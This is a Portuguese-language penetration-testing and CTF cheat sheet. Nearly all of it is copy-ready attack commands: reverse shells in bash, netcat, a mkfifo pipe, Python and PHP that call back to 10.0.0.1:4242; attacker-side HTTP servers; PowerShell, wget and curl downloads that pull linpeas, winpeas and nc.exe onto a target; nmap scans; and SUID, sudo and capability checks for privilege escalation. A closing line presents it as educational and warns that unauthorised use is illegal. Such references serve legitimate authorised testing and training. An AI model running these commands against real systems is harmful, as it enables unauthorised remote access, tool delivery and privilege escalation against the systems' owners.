---
title: "SecOps Cheat Sheet"
---

# 📑 Base de Conhecimento (Cheat Sheet)

> [!TIP]
> Use o `CTRL+F` para buscar rapidamente por um comando específico nesta página. Esta base é atualizada conforme novos engajamentos e desafios de CTF.

---

## 🐚 Reverse Shells
*Comandos rápidos para obter acesso inicial em diferentes ambientes.*

:::important{name="Aviso de Segurança"}
Sempre verifique o IP e a Porta (`10.0.0.1:4242`) antes de executar.
:::

###  Linux / Unix
#### Bash (Standard)
```bash
/bin/bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
```

#### Netcat (OpenBSD)
```bash
nc -e /bin/sh 10.0.0.1 4242
```

#### Netcat (BusyBox/Traditional)
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
```

---

###  Scripting Languages
#### Python
```python
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

#### PHP
```php
php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
```

---

## 📁 Transferência de Arquivos
*Métodos para exfiltração de dados e upload de ferramentas.*

### 📂 Servidores Rápidos (Atacante)
| Método | Comando |
| :--- | :--- |
| **Python 3** | `python3 -m http.server 80` |
| **Python 2** | `python -m SimpleHTTPServer 80` |
| **PHP** | `php -S 0.0.0.0:80` |

### 📥 Download no Alvo (Vítima)
#### Linux
```bash
wget http://10.0.0.1/linpeas.sh
curl -O http://10.0.0.1/linpeas.sh
```

#### Windows PowerShell
```powershell
iwr -uri http://10.0.0.1/winpeas.exe -outfile winpeas.exe
(New-Object System.Net.WebClient).DownloadFile('http://10.0.0.1/nc.exe', 'nc.exe')
```

---

## 🔍 Enumeração & Pós-Exploração

### 📡 Network Scanning
> [!NOTE]
> Enumeração é a fase mais importante de qualquer Pentest.

```bash
# Varredura Completa e Rápida
nmap -sC -sV -p- -T4 -oN full_scan.txt 10.10.x.x

# Varredura de UDP (Lenta)
nmap -sU -T4 --top-ports 20 -oN udp_scan.txt 10.10.x.x
```

### 🗝️ PrivEsc (Linux)
*   **SUID Search:** `find / -perm -u=s -type f 2>/dev/null`
*   **Sudo Rights:** `sudo -l`
*   **Capabilities:** `getcap -r / 2>/dev/null`

---

> [!IMPORTANT]
> Esta documentação é estritamente para fins educacionais. O uso sem autorização em sistemas de terceiros é ilegal.
